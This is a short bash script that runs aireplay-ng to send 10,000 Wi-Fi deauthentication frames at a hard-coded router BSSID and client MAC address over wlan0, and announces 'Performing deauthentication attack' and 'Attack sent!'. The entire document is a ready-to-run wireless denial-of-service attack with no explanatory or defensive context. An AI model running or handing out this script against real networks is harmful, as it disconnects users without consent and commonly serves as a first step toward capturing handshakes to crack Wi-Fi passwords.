#!/bin/bash
ROUTER_BSSID="64:66:24:F8:EA:17"
CLIENT_MAC="A4:4B:D5:BD:B8:4B"
echo "[*] Performing deauthentication attack..."
sudo aireplay-ng --deauth 10000 -a $ROUTER_BSSID -c $CLIENT_MAC wlan0
echo "[*] Attack sent!"
